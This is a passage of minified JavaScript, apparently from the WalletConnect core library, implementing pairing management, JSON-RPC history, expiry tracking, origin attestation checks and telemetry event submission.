                throw i.setError(Aa.subscribe_pairing_topic_failure),
                v
            }
            return i.addTrace(Ws.subscribe_pairing_topic_success),
            b
        }
        ),
        sr(this, "activate", async ({topic: o}) => {
            this.isInitialized();
            const i = yn(Ze.FIVE_MINUTES);
            this.core.expirer.set(o, i),
            await this.pairings.update(o, {
                active: !0,
                expiry: i
            })
        }
        ),
        sr(this, "ping", async o => {
            this.isInitialized(),
            await this.isValidPing(o),
            this.logger.warn("ping() is deprecated and will be removed in the next major release.");
            const {topic: i} = o;
            if (this.pairings.keys.includes(i)) {
                const n = await this.sendRequest(i, "wc_pairingPing", {})
                  , {done: s, resolve: a, reject: l} = Il();
                this.events.once(wr("pairing_ping", n), ({error: f}) => {
                    f ? l(f) : a()
                }
                ),
                await s()
            }
        }
        ),
        sr(this, "updateExpiry", async ({topic: o, expiry: i}) => {
            this.isInitialized(),
            await this.pairings.update(o, {
                expiry: i
            })
        }
        ),
        sr(this, "updateMetadata", async ({topic: o, metadata: i}) => {
            this.isInitialized(),
            await this.pairings.update(o, {
                peerMetadata: i
            })
        }
        ),
        sr(this, "getPairings", () => (this.isInitialized(),
        this.pairings.values)),
        sr(this, "disconnect", async o => {
            this.isInitialized(),
            await this.isValidDisconnect(o);
            const {topic: i} = o;
            this.pairings.keys.includes(i) && (await this.sendRequest(i, "wc_pairingDelete", Nr("USER_DISCONNECTED")),
            await this.deletePairing(i))
        }
        ),
        sr(this, "formatUriFromPairing", o => {
            this.isInitialized();
            const {topic: i, relay: n, expiry: s, methods: a} = o
              , l = this.core.crypto.keychain.get(i);
            return c_({
                protocol: this.core.protocol,
                version: this.core.version,
                topic: i,
                symKey: l,
                relay: n,
                expiryTimestamp: s,
                methods: a
            })
        }
        ),
        sr(this, "sendRequest", async (o, i, n) => {
            const s = jl(i, n)
              , a = await this.core.crypto.encode(o, s)
              , l = yp[i].req;
            return this.core.history.set(o, s),
            this.core.relayer.publish(o, a, l),
            s.id
        }
        ),
        sr(this, "sendResult", async (o, i, n) => {
            const s = N3(o, n)
              , a = await this.core.crypto.encode(i, s)
              , l = (await this.core.history.get(i, o)).request.method
              , f = yp[l].res;
            await this.core.relayer.publish(i, a, f),
            await this.core.history.resolve(s)
        }
        ),
        sr(this, "sendError", async (o, i, n) => {
            const s = D3(o, n)
              , a = await this.core.crypto.encode(i, s)
              , l = (await this.core.history.get(i, o)).request.method
              , f = yp[l] ? yp[l].res : yp.unregistered_method.res;
            await this.core.relayer.publish(i, a, f),
            await this.core.history.resolve(s)
        }
        ),
        sr(this, "deletePairing", async (o, i) => {
            await this.core.relayer.unsubscribe(o),
            await Promise.all([this.pairings.delete(o, Nr("USER_DISCONNECTED")), this.core.crypto.deleteSymKey(o), i ? Promise.resolve() : this.core.expirer.del(o)])
        }
        ),
        sr(this, "cleanup", async () => {
            const o = this.pairings.getAll().filter(i => Wc(i.expiry));
            await Promise.all(o.map(i => this.deletePairing(i.topic)))
        }
        ),
        sr(this, "onRelayEventRequest", async o => {
            const {topic: i, payload: n} = o;
            switch (n.method) {
            case "wc_pairingPing":
                return await this.onPairingPingRequest(i, n);
            case "wc_pairingDelete":
                return await this.onPairingDeleteRequest(i, n);
            default:
                return await this.onUnknownRpcMethodRequest(i, n)
            }
        }
        ),
        sr(this, "onRelayEventResponse", async o => {
            const {topic: i, payload: n} = o
              , s = (await this.core.history.get(i, n.id)).request.method;
            switch (s) {
            case "wc_pairingPing":
                return this.onPairingPingResponse(i, n);
            default:
                return this.onUnknownRpcMethodResponse(s)
            }
        }
        ),
        sr(this, "onPairingPingRequest", async (o, i) => {
            const {id: n} = i;
            try {
                this.isValidPing({
                    topic: o
                }),
                await this.sendResult(n, o, !0),
                this.events.emit(Nl.ping, {
                    id: n,
                    topic: o
                })
            } catch (s) {
                await this.sendError(n, o, s),
                this.logger.error(s)
            }
        }
        ),
        sr(this, "onPairingPingResponse", (o, i) => {
            const {id: n} = i;
            setTimeout( () => {
                Ds(i) ? this.events.emit(wr("pairing_ping", n), {}) : Ni(i) && this.events.emit(wr("pairing_ping", n), {
                    error: i.error
                })
            }
            , 500)
        }
        ),
        sr(this, "onPairingDeleteRequest", async (o, i) => {
            const {id: n} = i;
            try {
                this.isValidDisconnect({
                    topic: o
                }),
                await this.deletePairing(o),
                this.events.emit(Nl.delete, {
                    id: n,
                    topic: o
                })
            } catch (s) {
                await this.sendError(n, o, s),
                this.logger.error(s)
            }
        }
        ),
        sr(this, "onUnknownRpcMethodRequest", async (o, i) => {
            const {id: n, method: s} = i;
            try {
                if (this.registeredMethods.includes(s))
                    return;
                const a = Nr("WC_METHOD_UNSUPPORTED", s);
                await this.sendError(n, o, a),
                this.logger.error(a)
            } catch (a) {
                await this.sendError(n, o, a),
                this.logger.error(a)
            }
        }
        ),
        sr(this, "onUnknownRpcMethodResponse", o => {
            this.registeredMethods.includes(o) || this.logger.error(Nr("WC_METHOD_UNSUPPORTED", o))
        }
        ),
        sr(this, "isValidPair", (o, i) => {
            var n;
            if (!Io(o)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `pair() params: ${o}`);
                throw i.setError(Aa.malformed_pairing_uri),
                new Error(a)
            }
            if (!bne(o.uri)) {
                const {message: a} = Xe("MISSING_OR_INVALID", `pair() uri: ${o.uri}`);
                throw i.setError(Aa.malformed_pairing_uri),
                new Error(a)
            }
            const s = a_(o == null ? void 0 : o.uri);
            if (!((n = s == null ? void 0 : s.relay) != null && n.protocol)) {
                const {message: a} = Xe("MISSING_OR_INVALID", "pair() uri#relay-protocol");
                throw i.setError(Aa.malformed_pairing_uri),
                new Error(a)
            }
            if (!(s != null && s.symKey)) {
                const {message: a} = Xe("MISSING_OR_INVALID", "pair() uri#symKey");
                throw i.setError(Aa.malformed_pairing_uri),
                new Error(a)
            }
            if (s != null && s.expiryTimestamp && Ze.toMiliseconds(s == null ? void 0 : s.expiryTimestamp) < Date.now()) {
                i.setError(Aa.pairing_expired);
                const {message: a} = Xe("EXPIRED", "pair() URI has expired. Please try again with a new connection URI.");
                throw new Error(a)
            }
        }
        ),
        sr(this, "isValidPing", async o => {
            if (!Io(o)) {
                const {message: n} = Xe("MISSING_OR_INVALID", `ping() params: ${o}`);
                throw new Error(n)
            }
            const {topic: i} = o;
            await this.isValidPairingTopic(i)
        }
        ),
        sr(this, "isValidDisconnect", async o => {
            if (!Io(o)) {
                const {message: n} = Xe("MISSING_OR_INVALID", `disconnect() params: ${o}`);
                throw new Error(n)
            }
            const {topic: i} = o;
            await this.isValidPairingTopic(i)
        }
        ),
        sr(this, "isValidPairingTopic", async o => {
            if (!un(o, !1)) {
                const {message: i} = Xe("MISSING_OR_INVALID", `pairing topic should be a string: ${o}`);
                throw new Error(i)
            }
            if (!this.pairings.keys.includes(o)) {
                const {message: i} = Xe("NO_MATCHING_KEY", `pairing topic doesn't exist: ${o}`);
                throw new Error(i)
            }
            if (Wc(this.pairings.get(o).expiry)) {
                await this.deletePairing(o);
                const {message: i} = Xe("EXPIRED", `pairing topic: ${o}`);
                throw new Error(i)
            }
        }
        ),
        this.core = e,
        this.logger = xo(t, this.name),
        this.pairings = new _u(this.core,this.logger,this.name,this.storagePrefix)
    }
    get context() {
        return zo(this.logger)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
    registerRelayerEvents() {
        this.core.relayer.on(Bn.message, async e => {
            const {topic: t, message: o, transportType: i} = e;
            if (this.pairings.keys.includes(t) && i !== kr.link_mode && !this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(o)))
                try {
                    const n = await this.core.crypto.decode(t, o);
                    F3(n) ? (this.core.history.set(t, n),
                    await this.onRelayEventRequest({
                        topic: t,
                        payload: n
                    })) : U1(n) && (await this.core.history.resolve(n),
                    await this.onRelayEventResponse({
                        topic: t,
                        payload: n
                    }),
                    this.core.history.delete(t, n.id)),
                    await this.core.relayer.messages.ack(t, o)
                } catch (n) {
                    this.logger.error(n)
                }
        }
        )
    }
    registerExpirerEvents() {
        this.core.expirer.on(Oi.expired, async e => {
            const {topic: t} = vN(e.target);
            t && this.pairings.keys.includes(t) && (await this.deletePairing(t, !0),
            this.events.emit(Nl.expire, {
                topic: t
            }))
        }
        )
    }
}
var Rae = Object.defineProperty
  , Wae = (r, e, t) => e in r ? Rae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Un = (r, e, t) => Wae(r, typeof e != "symbol" ? e + "" : e, t);
class Mae extends KK {
    constructor(e, t) {
        super(e, t),
        this.core = e,
        this.logger = t,
        Un(this, "records", new Map),
        Un(this, "events", new fs.EventEmitter),
        Un(this, "name", Doe),
        Un(this, "version", Foe),
        Un(this, "cached", []),
        Un(this, "initialized", !1),
        Un(this, "storagePrefix", Zs),
        Un(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(o => this.records.set(o.id, o)),
            this.cached = [],
            this.registerEventListeners(),
            this.initialized = !0)
        }
        ),
        Un(this, "set", (o, i, n) => {
            if (this.isInitialized(),
            this.logger.debug("Setting JSON-RPC request history record"),
            this.logger.trace({
                type: "method",
                method: "set",
                topic: o,
                request: i,
                chainId: n
            }),
            this.records.has(i.id))
                return;
            const s = {
                id: i.id,
                topic: o,
                request: {
                    method: i.method,
                    params: i.params || null
                },
                chainId: n,
                expiry: yn(Ze.THIRTY_DAYS)
            };
            this.records.set(s.id, s),
            this.persist(),
            this.events.emit(Ki.created, s)
        }
        ),
        Un(this, "resolve", async o => {
            if (this.isInitialized(),
            this.logger.debug("Updating JSON-RPC response history record"),
            this.logger.trace({
                type: "method",
                method: "update",
                response: o
            }),
            !this.records.has(o.id))
                return;
            const i = await this.getRecord(o.id);
            typeof i.response > "u" && (i.response = Ni(o) ? {
                error: o.error
            } : {
                result: o.result
            },
            this.records.set(i.id, i),
            this.persist(),
            this.events.emit(Ki.updated, i))
        }
        ),
        Un(this, "get", async (o, i) => (this.isInitialized(),
        this.logger.debug("Getting record"),
        this.logger.trace({
            type: "method",
            method: "get",
            topic: o,
            id: i
        }),
        await this.getRecord(i))),
        Un(this, "delete", (o, i) => {
            this.isInitialized(),
            this.logger.debug("Deleting record"),
            this.logger.trace({
                type: "method",
                method: "delete",
                id: i
            }),
            this.values.forEach(n => {
                if (n.topic === o) {
                    if (typeof i < "u" && n.id !== i)
                        return;
                    this.records.delete(n.id),
                    this.events.emit(Ki.deleted, n)
                }
            }
            ),
            this.persist()
        }
        ),
        Un(this, "exists", async (o, i) => (this.isInitialized(),
        this.records.has(i) ? (await this.getRecord(i)).topic === o : !1)),
        Un(this, "on", (o, i) => {
            this.events.on(o, i)
        }
        ),
        Un(this, "once", (o, i) => {
            this.events.once(o, i)
        }
        ),
        Un(this, "off", (o, i) => {
            this.events.off(o, i)
        }
        ),
        Un(this, "removeListener", (o, i) => {
            this.events.removeListener(o, i)
        }
        ),
        this.logger = xo(t, this.name)
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get size() {
        return this.records.size
    }
    get keys() {
        return Array.from(this.records.keys())
    }
    get values() {
        return Array.from(this.records.values())
    }
    get pending() {
        const e = [];
        return this.values.forEach(t => {
            if (typeof t.response < "u")
                return;
            const o = {
                topic: t.topic,
                request: jl(t.request.method, t.request.params, t.id),
                chainId: t.chainId
            };
            return e.push(o)
        }
        ),
        e
    }
    async setJsonRpcRecords(e) {
        await this.core.storage.setItem(this.storageKey, e)
    }
    async getJsonRpcRecords() {
        return await this.core.storage.getItem(this.storageKey)
    }
    getRecord(e) {
        this.isInitialized();
        const t = this.records.get(e);
        if (!t) {
            const {message: o} = Xe("NO_MATCHING_KEY", `${this.name}: ${e}`);
            throw new Error(o)
        }
        return t
    }
    async persist() {
        await this.setJsonRpcRecords(this.values),
        this.events.emit(Ki.sync)
    }
    async restore() {
        try {
            const e = await this.getJsonRpcRecords();
            if (typeof e > "u" || !e.length)
                return;
            if (this.records.size) {
                const {message: t} = Xe("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(t),
                new Error(t)
            }
            this.cached = e,
            this.logger.debug(`Successfully Restored records for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                records: this.values
            })
        } catch (e) {
            this.logger.debug(`Failed to Restore records for ${this.name}`),
            this.logger.error(e)
        }
    }
    registerEventListeners() {
        this.events.on(Ki.created, e => {
            const t = Ki.created;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                record: e
            })
        }
        ),
        this.events.on(Ki.updated, e => {
            const t = Ki.updated;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                record: e
            })
        }
        ),
        this.events.on(Ki.deleted, e => {
            const t = Ki.deleted;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                record: e
            })
        }
        ),
        this.core.heartbeat.on(Su.pulse, () => {
            this.cleanup()
        }
        )
    }
    cleanup() {
        try {
            this.isInitialized();
            let e = !1;
            this.records.forEach(t => {
                Ze.toMiliseconds(t.expiry || 0) - Date.now() <= 0 && (this.logger.info(`Deleting expired history log: ${t.id}`),
                this.records.delete(t.id),
                this.events.emit(Ki.deleted, t, !1),
                e = !0)
            }
            ),
            e && this.persist()
        } catch (e) {
            this.logger.warn(e)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var Nae = Object.defineProperty
  , Dae = (r, e, t) => e in r ? Nae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , Yn = (r, e, t) => Dae(r, typeof e != "symbol" ? e + "" : e, t);
class Fae extends eZ {
    constructor(e, t) {
        super(e, t),
        this.core = e,
        this.logger = t,
        Yn(this, "expirations", new Map),
        Yn(this, "events", new fs.EventEmitter),
        Yn(this, "name", Uoe),
        Yn(this, "version", koe),
        Yn(this, "cached", []),
        Yn(this, "initialized", !1),
        Yn(this, "storagePrefix", Zs),
        Yn(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(o => this.expirations.set(o.target, o)),
            this.cached = [],
            this.registerEventListeners(),
            this.initialized = !0)
        }
        ),
        Yn(this, "has", o => {
            try {
                const i = this.formatTarget(o);
                return typeof this.getExpiration(i) < "u"
            } catch {
                return !1
            }
        }
        ),
        Yn(this, "set", (o, i) => {
            this.isInitialized();
            const n = this.formatTarget(o)
              , s = {
                target: n,
                expiry: i
            };
            this.expirations.set(n, s),
            this.checkExpiry(n, s),
            this.events.emit(Oi.created, {
                target: n,
                expiration: s
            })
        }
        ),
        Yn(this, "get", o => {
            this.isInitialized();
            const i = this.formatTarget(o);
            return this.getExpiration(i)
        }
        ),
        Yn(this, "del", o => {
            if (this.isInitialized(),
            this.has(o)) {
                const i = this.formatTarget(o)
                  , n = this.getExpiration(i);
                this.expirations.delete(i),
                this.events.emit(Oi.deleted, {
                    target: i,
                    expiration: n
                })
            }
        }
        ),
        Yn(this, "on", (o, i) => {
            this.events.on(o, i)
        }
        ),
        Yn(this, "once", (o, i) => {
            this.events.once(o, i)
        }
        ),
        Yn(this, "off", (o, i) => {
            this.events.off(o, i)
        }
        ),
        Yn(this, "removeListener", (o, i) => {
            this.events.removeListener(o, i)
        }
        ),
        this.logger = xo(t, this.name)
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.expirations.size
    }
    get keys() {
        return Array.from(this.expirations.keys())
    }
    get values() {
        return Array.from(this.expirations.values())
    }
    formatTarget(e) {
        if (typeof e == "string")
            return xee(e);
        if (typeof e == "number")
            return wee(e);
        const {message: t} = Xe("UNKNOWN_TYPE", `Target type: ${typeof e}`);
        throw new Error(t)
    }
    async setExpirations(e) {
        await this.core.storage.setItem(this.storageKey, e)
    }
    async getExpirations() {
        return await this.core.storage.getItem(this.storageKey)
    }
    async persist() {
        await this.setExpirations(this.values),
        this.events.emit(Oi.sync)
    }
    async restore() {
        try {
            const e = await this.getExpirations();
            if (typeof e > "u" || !e.length)
                return;
            if (this.expirations.size) {
                const {message: t} = Xe("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(t),
                new Error(t)
            }
            this.cached = e,
            this.logger.debug(`Successfully Restored expirations for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                expirations: this.values
            })
        } catch (e) {
            this.logger.debug(`Failed to Restore expirations for ${this.name}`),
            this.logger.error(e)
        }
    }
    getExpiration(e) {
        const t = this.expirations.get(e);
        if (!t) {
            const {message: o} = Xe("NO_MATCHING_KEY", `${this.name}: ${e}`);
            throw this.logger.warn(o),
            new Error(o)
        }
        return t
    }
    checkExpiry(e, t) {
        const {expiry: o} = t;
        Ze.toMiliseconds(o) - Date.now() <= 0 && this.expire(e, t)
    }
    expire(e, t) {
        this.expirations.delete(e),
        this.events.emit(Oi.expired, {
            target: e,
            expiration: t
        })
    }
    checkExpirations() {
        this.core.relayer.connected && this.expirations.forEach( (e, t) => this.checkExpiry(t, e))
    }
    registerEventListeners() {
        this.core.heartbeat.on(Su.pulse, () => this.checkExpirations()),
        this.events.on(Oi.created, e => {
            const t = Oi.created;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                data: e
            }),
            this.persist()
        }
        ),
        this.events.on(Oi.expired, e => {
            const t = Oi.expired;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                data: e
            }),
            this.persist()
        }
        ),
        this.events.on(Oi.deleted, e => {
            const t = Oi.deleted;
            this.logger.info(`Emitting ${t}`),
            this.logger.debug({
                type: "event",
                event: t,
                data: e
            }),
            this.persist()
        }
        )
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var Uae = Object.defineProperty
  , kae = (r, e, t) => e in r ? Uae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , ln = (r, e, t) => kae(r, typeof e != "symbol" ? e + "" : e, t);
class Lae extends tZ {
    constructor(e, t, o) {
        super(e, t, o),
        this.core = e,
        this.logger = t,
        this.store = o,
        ln(this, "name", Loe),
        ln(this, "abortController"),
        ln(this, "isDevEnv"),
        ln(this, "verifyUrlV3", zoe),
        ln(this, "storagePrefix", Zs),
        ln(this, "version", cD),
        ln(this, "publicKey"),
        ln(this, "fetchPromise"),
        ln(this, "init", async () => {
            var i;
            this.isDevEnv || (this.publicKey = await this.store.getItem(this.storeKey),
            this.publicKey && Ze.toMiliseconds((i = this.publicKey) == null ? void 0 : i.expiresAt) < Date.now() && (this.logger.debug("verify v2 public key expired"),
            await this.removePublicKey()))
        }
        ),
        ln(this, "register", async i => {
            if (!Yd() || this.isDevEnv)
                return;
            const n = window.location.origin
              , {id: s, decryptedId: a} = i
              , l = `${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${n}&id=${s}&decryptedId=${a}`;
            try {
                const f = Ha.getDocument()
                  , h = this.startAbortTimer(Ze.ONE_SECOND * 5)
                  , p = await new Promise( (b, v) => {
                    const T = () => {
                        window.removeEventListener("message", E),
                        f.body.removeChild(x),
                        v("attestation aborted")
                    }
                    ;
                    this.abortController.signal.addEventListener("abort", T);
                    const x = f.createElement("iframe");
                    x.src = l,
                    x.style.display = "none",
                    x.addEventListener("error", T, {
                        signal: this.abortController.signal
                    });
                    const E = B => {
                        if (B.data && typeof B.data == "string")
                            try {
                                const P = JSON.parse(B.data);
                                if (P.type === "verify_attestation") {
                                    if (NE(P.attestation).payload.id !== s)
                                        return;
                                    clearInterval(h),
                                    f.body.removeChild(x),
                                    this.abortController.signal.removeEventListener("abort", T),
                                    window.removeEventListener("message", E),
                                    b(P.attestation === null ? "" : P.attestation)
                                }
                            } catch (P) {
                                this.logger.warn(P)
                            }
                    }
                    ;
                    f.body.appendChild(x),
                    window.addEventListener("message", E, {
                        signal: this.abortController.signal
                    })
                }
                );
                return this.logger.debug("jwt attestation", p),
                p
            } catch (f) {
                this.logger.warn(f)
            }
            return ""
        }
        ),
        ln(this, "resolve", async i => {
            if (this.isDevEnv)
                return "";
            const {attestationId: n, hash: s, encryptedId: a} = i;
            if (n === "") {
                this.logger.debug("resolve: attestationId is empty, skipping");
                return
            }
            if (n) {
                if (NE(n).payload.id !== a)
                    return;
                const f = await this.isValidJwtAttestation(n);
                if (f) {
                    if (!f.isVerified) {
                        this.logger.warn("resolve: jwt attestation: origin url not verified");
                        return
                    }
                    return f
                }
            }
            if (!s)
                return;
            const l = this.getVerifyUrl(i == null ? void 0 : i.verifyUrl);
            return this.fetchAttestation(s, l)
        }
        ),
        ln(this, "fetchAttestation", async (i, n) => {
            this.logger.debug(`resolving attestation: ${i} from url: ${n}`);
            const s = this.startAbortTimer(Ze.ONE_SECOND * 5)
              , a = await fetch(`${n}/attestation/${i}?v2Supported=true`, {
                signal: this.abortController.signal
            });
            return clearTimeout(s),
            a.status === 200 ? await a.json() : void 0
        }
        ),
        ln(this, "getVerifyUrl", i => {
            let n = i || Np;
            return joe.includes(n) || (this.logger.info(`verify url: ${n}, not included in trusted list, assigning default: ${Np}`),
            n = Np),
            n
        }
        ),
        ln(this, "fetchPublicKey", async () => {
            try {
                this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);
                const i = this.startAbortTimer(Ze.FIVE_SECONDS)
                  , n = await fetch(`${this.verifyUrlV3}/public-key`, {
                    signal: this.abortController.signal
                });
                return clearTimeout(i),
                await n.json()
            } catch (i) {
                this.logger.warn(i)
            }
        }
        ),
        ln(this, "persistPublicKey", async i => {
            this.logger.debug("persisting public key to local storage", i),
            await this.store.setItem(this.storeKey, i),
            this.publicKey = i
        }
        ),
        ln(this, "removePublicKey", async () => {
            this.logger.debug("removing verify v2 public key from storage"),
            await this.store.removeItem(this.storeKey),
            this.publicKey = void 0
        }
        ),
        ln(this, "isValidJwtAttestation", async i => {
            const n = await this.getPublicKey();
            try {
                if (n)
                    return this.validateAttestation(i, n)
            } catch (a) {
                this.logger.error(a),
                this.logger.warn("error validating attestation")
            }
            const s = await this.fetchAndPersistPublicKey();
            try {
                if (s)
                    return this.validateAttestation(i, s)
            } catch (a) {
                this.logger.error(a),
                this.logger.warn("error validating attestation")
            }
        }
        ),
        ln(this, "getPublicKey", async () => this.publicKey ? this.publicKey : await this.fetchAndPersistPublicKey()),
        ln(this, "fetchAndPersistPublicKey", async () => {
            if (this.fetchPromise)
                return await this.fetchPromise,
                this.publicKey;
            this.fetchPromise = new Promise(async n => {
                const s = await this.fetchPublicKey();
                s && (await this.persistPublicKey(s),
                n(s))
            }
            );
            const i = await this.fetchPromise;
            return this.fetchPromise = void 0,
            i
        }
        ),
        ln(this, "validateAttestation", (i, n) => {
            const s = Zre(i, n.publicKey)
              , a = {
                hasExpired: Ze.toMiliseconds(s.exp) < Date.now(),
                payload: s
            };
            if (a.hasExpired)
                throw this.logger.warn("resolve: jwt attestation expired"),
                new Error("JWT attestation expired");
            return {
                origin: a.payload.origin,
                isScam: a.payload.isScam,
                isVerified: a.payload.isVerified
            }
        }
        ),
        this.logger = xo(t, this.name),
        this.abortController = new AbortController,
        this.isDevEnv = C3(),
        this.init()
    }
    get storeKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//verify:public:key"
    }
    get context() {
        return zo(this.logger)
    }
    startAbortTimer(e) {
        return this.abortController = new AbortController,
        setTimeout( () => this.abortController.abort(), Ze.toMiliseconds(e))
    }
}
var $ae = Object.defineProperty
  , zae = (r, e, t) => e in r ? $ae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , V_ = (r, e, t) => zae(r, typeof e != "symbol" ? e + "" : e, t);
class jae extends rZ {
    constructor(e, t) {
        super(e, t),
        this.projectId = e,
        this.logger = t,
        V_(this, "context", qoe),
        V_(this, "registerDeviceToken", async o => {
            const {clientId: i, token: n, notificationType: s, enableEncrypted: a=!1} = o
              , l = `${Voe}/${this.projectId}/clients`;
            await fetch(l, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    client_id: i,
                    type: s,
                    token: n,
                    always_raw: a
                })
            })
        }
        ),
        this.logger = xo(t, this.context)
    }
}
var qae = Object.defineProperty
  , H_ = Object.getOwnPropertySymbols
  , Vae = Object.prototype.hasOwnProperty
  , Hae = Object.prototype.propertyIsEnumerable
  , iA = (r, e, t) => e in r ? qae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , xp = (r, e) => {
    for (var t in e || (e = {}))
        Vae.call(e, t) && iA(r, t, e[t]);
    if (H_)
        for (var t of H_(e))
            Hae.call(e, t) && iA(r, t, e[t]);
    return r
}
  , En = (r, e, t) => iA(r, typeof e != "symbol" ? e + "" : e, t);
class Gae extends nZ {
    constructor(e, t, o=!0) {
        super(e, t, o),
        this.core = e,
        this.logger = t,
        En(this, "context", Goe),
        En(this, "storagePrefix", Zs),
        En(this, "storageVersion", Hoe),
        En(this, "events", new Map),
        En(this, "shouldPersist", !1),
        En(this, "init", async () => {
            if (!C3())
                try {
                    const i = {
                        eventId: OB(),
                        timestamp: Date.now(),
                        domain: this.getAppDomain(),
                        props: {
                            event: "INIT",
                            type: "",
                            properties: {
                                client_id: await this.core.crypto.getClientId(),
                                user_agent: xN(this.core.relayer.protocol, this.core.relayer.version, XE)
                            }
                        }
                    };
                    await this.sendEvent([i])
                } catch (i) {
                    this.logger.warn(i)
                }
        }
        ),
        En(this, "createEvent", i => {
            const {event: n="ERROR", type: s="", properties: {topic: a, trace: l}} = i
              , f = OB()
              , h = this.core.projectId || ""
              , p = Date.now()
              , b = xp({
                eventId: f,
                timestamp: p,
                props: {
                    event: n,
                    type: s,
                    properties: {
                        topic: a,
                        trace: l
                    }
                },
                bundleId: h,
                domain: this.getAppDomain()
            }, this.setMethods(f));
            return this.telemetryEnabled && (this.events.set(f, b),
            this.shouldPersist = !0),
            b
        }
        ),
        En(this, "getEvent", i => {
            const {eventId: n, topic: s} = i;
            if (n)
                return this.events.get(n);
            const a = Array.from(this.events.values()).find(l => l.props.properties.topic === s);
            if (a)
                return xp(xp({}, a), this.setMethods(a.eventId))
        }
        ),
        En(this, "deleteEvent", i => {
            const {eventId: n} = i;
            this.events.delete(n),
            this.shouldPersist = !0
        }
        ),
        En(this, "setEventListeners", () => {
            this.core.heartbeat.on(Su.pulse, async () => {
                this.shouldPersist && await this.persist(),
                this.events.forEach(i => {
                    Ze.fromMiliseconds(Date.now()) - Ze.fromMiliseconds(i.timestamp) > Koe && (this.events.delete(i.eventId),
                    this.shouldPersist = !0)
                }
                )
            }
            )
        }
        ),
        En(this, "setMethods", i => ({
            addTrace: n => this.addTrace(i, n),
            setError: n => this.setError(i, n)
        })),
        En(this, "addTrace", (i, n) => {
            const s = this.events.get(i);
            s && (s.props.properties.trace.push(n),
            this.events.set(i, s),
            this.shouldPersist = !0)
        }
        ),
        En(this, "setError", (i, n) => {
            const s = this.events.get(i);
            s && (s.props.type = n,
            s.timestamp = Date.now(),
            this.events.set(i, s),
            this.shouldPersist = !0)
        }
        ),
        En(this, "persist", async () => {
            await this.core.storage.setItem(this.storageKey, Array.from(this.events.values())),
            this.shouldPersist = !1
        }
        ),
        En(this, "restore", async () => {
            try {
                const i = await this.core.storage.getItem(this.storageKey) || [];
                if (!i.length)
                    return;
                i.forEach(n => {
                    this.events.set(n.eventId, xp(xp({}, n), this.setMethods(n.eventId)))
                }
                )
            } catch (i) {
                this.logger.warn(i)
            }
        }
        ),
        En(this, "submit", async () => {
            if (!this.telemetryEnabled || this.events.size === 0)
                return;
            const i = [];
            for (const [n,s] of this.events)
                s.props.type && i.push(s);
            if (i.length !== 0)
                try {
                    if ((await this.sendEvent(i)).ok)
                        for (const n of i)
                            this.events.delete(n.eventId),
                            this.shouldPersist = !0
                } catch (n) {
                    this.logger.warn(n)
                }
        }
        ),
        En(this, "sendEvent", async i => {
            const n = this.getAppDomain() ? "" : "&sp=desktop";
            return await fetch(`${Zoe}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${XE}${n}`, {
                method: "POST",
                body: JSON.stringify(i)
            })
        }
        ),
        En(this, "getAppDomain", () => mN().url),
        this.logger = xo(t, this.context),
        this.telemetryEnabled = o,
        o ? this.restore().then(async () => {
            await this.submit(),
            this.setEventListeners()
        }
        ) : this.persist()
    }
    get storageKey() {
        return this.storagePrefix + this.storageVersion + this.core.customStoragePrefix + "//" + this.context
    }
}
var Kae = Object.defineProperty
  , G_ = Object.getOwnPropertySymbols
  , Zae = Object.prototype.hasOwnProperty
  , Yae = Object.prototype.propertyIsEnumerable
  , sA = (r, e, t) => e in r ? Kae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , K_ = (r, e) => {
    for (var t in e || (e = {}))
        Zae.call(e, t) && sA(r, t, e[t]);
    if (G_)
        for (var t of G_(e))
            Yae.call(e, t) && sA(r, t, e[t]);
    return r
}
  , Ur = (r, e, t) => sA(r, typeof e != "symbol" ? e + "" : e, t);
class U3 extends qK {
    constructor(e) {
        var t;
        super(e),
        Ur(this, "protocol", aD),
        Ur(this, "version", cD),
        Ur(this, "name", YE),
        Ur(this, "relayUrl"),
        Ur(this, "projectId"),
        Ur(this, "customStoragePrefix"),
        Ur(this, "events", new fs.EventEmitter),
        Ur(this, "logger"),
